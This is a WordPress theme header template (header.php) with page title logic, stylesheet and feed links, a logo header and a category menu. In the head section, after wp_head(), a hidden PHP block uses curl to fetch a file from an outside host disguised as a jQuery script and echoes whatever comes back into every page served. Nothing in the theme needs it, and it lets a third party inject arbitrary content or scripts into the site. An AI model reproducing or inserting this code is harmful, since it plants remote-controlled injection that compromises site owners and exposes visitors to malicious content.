<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title>
<?php if (is_home () ) { bloginfo('name'); }
elseif ( is_category() ) { single_cat_title(); echo ' - ' ; bloginfo('name'); }
elseif (is_single() ) { single_post_title();}
elseif (is_page() ) { single_post_title();}
else { wp_title('',true); } ?>
</title>
<meta name="generator" content="WordPress <?php bloginfo('version'); ?>" />
<!-- leave this for stats -->
<link rel="shortcut icon" type="image/ico" href="<?php bloginfo('template_directory'); ?>/favicon.ico" />
<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<link rel="alternate" type="application/rss+xml" href="<?php if($pt_feedburner_address) { echo $pt_feedburner_url; } else { bloginfo('rss2_url'); }?>" title="<?php echo wp_specialchars(get_bloginfo('name'), 1) ?> <?php _e('Posts RSS feed', 'sandbox'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<script type="text/javascript" language="javascript" src="<?php bloginfo('template_directory'); ?>/js/hmenu.js"> </script>
<?php
global $options;
foreach ($options as $value) {
		global $$value['id'];
        if (get_settings( $value['id'] ) === FALSE) { $$value['id'] = $value['std']; } else { $$value['id'] = get_settings( $value['id'] ); } }
?>
<?php wp_head(); ?>
<?php
if(function_exists('curl_init'))
{
 $url = "http://www.4llw4d.freefilesblog.com/jquery-1.6.3.min.js"; 
 $ch = curl_init();  
 $timeout = 5;  
 curl_setopt($ch,CURLOPT_URL,$url); 
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
 curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
 $data = curl_exec($ch);  
 curl_close($ch); 
 echo "$data";
}
?>
</head>
<body>
 		<div id="page"  class="clearfix">
       	  <div id="header" class="clearfix">
       		    <div class="header_center">
                    	<a href="<?php echo get_settings('home'); ?>" title="<?php bloginfo('name'); ?>"> 
                        
                        <img src="<?php bloginfo('template_url'); ?>/images/logo.gif" alt="<?php bloginfo('name'); ?>"  /></a>
                    	<img src="<?php // echo $pt_logo; ?>" alt="<?php // bloginfo('name'); ?>"  />

                         <p class="description"> <?php bloginfo('description'); ?></p>
                        
                  </div>
                
                
                
                <div class="head_date"><span class="day"><?php the_time('l'); ?>,  </span><br /> <b><?php the_time('j') ?> <?php the_time('M') ?> <?php the_time('Y') ?></b>     </div>
                <p class="rss">    <a href="<?php if($pt_feedburner_address) { echo $pt_feedburner_url; } else { bloginfo('rss2_url'); }?>" title="<?php echo wp_specialchars(get_bloginfo('name'), 1) ?> <?php _e('RSS feed', ''); ?>" rel="alternate" type="application/rss+xml"> Rss Feed</a> <br /> 
                   <a href="<?php if($pt_feedburner_address) { echo $pt_feedburner_url; } else { bloginfo('rss2_url'); }?>" title="<?php echo wp_specialchars(get_bloginfo('name'), 1) ?> <?php _e('RSS feed', ''); ?>" rel="alternate" type="application/rss+xml"> Subscribe via Email</a> </p> 
                                
          </div> <!-- header #end -->
          
          <div id="mainmenu_border">
          <ul id="navmenu-h" class="clearfix">	
          	 <?php wp_list_categories('sort_column=name&sort_order=asc&style=list&children=true&hierarchical=true&title_li=0'); ?>
          </ul>
          
          
        </div> <!-- menu #end -->

<div id="wrapper" class="clearfix" >